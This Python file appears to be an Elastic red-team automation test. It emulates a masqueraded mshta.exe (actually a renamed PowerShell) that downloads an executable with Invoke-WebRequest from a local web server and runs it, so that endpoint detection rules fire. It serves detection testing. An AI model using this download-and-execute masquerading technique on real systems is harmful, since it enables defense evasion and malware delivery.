# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common



@register_code_rta(
    id="cbed76ce-a373-4bc5-b1b3-f5330de18cc7",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(id="16c84e67-e5e7-44ff-aefa-4d771bcafc0c", name="Execution from Unusual Directory"),
        RuleMetadata(id="35dedf0c-8db6-4d70-b2dc-a133b808211f", name="Binary Masquerading via Untrusted Path"),
        {
            "rule_name": "Execution of a File Written by a Signed Binary Proxy",
            "rule_id": "ccbc4a79-3bae-4623-aaef-e28a96bf538b",
        },
        {
            "rule_name": "Script Execution via Microsoft HTML Application",
            "rule_id": "f0630213-c4c4-4898-9514-746395eb9962",
        },
        {
            "rule_name": "Suspicious Windows Script Interpreter Child Process",
            "rule_id": "83da4fac-563a-4af8-8f32-5a3797a9068e",
        },
    ],
    siem_rules=[],
    techniques=["T1218", "T1036", "T1055", "T1105", "T1059"],
)

EXE_FILE = _common.get_path("bin", "renamed_posh.exe")



def main():
    server, ip, port = _common.serve_web()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    mshta = "C:\\Users\\Public\\mshta.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    _common.copy_file(EXE_FILE, mshta)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    _common.log("Using a fake mshta to drop and execute an .exe")
    _common.execute([mshta, "/c", cmd], timeout=10)
    _common.execute([mshta, "/c", dropped], timeout=10, kill=True)
    _common.remove_file(mshta)
    _common.remove_file(dropped)


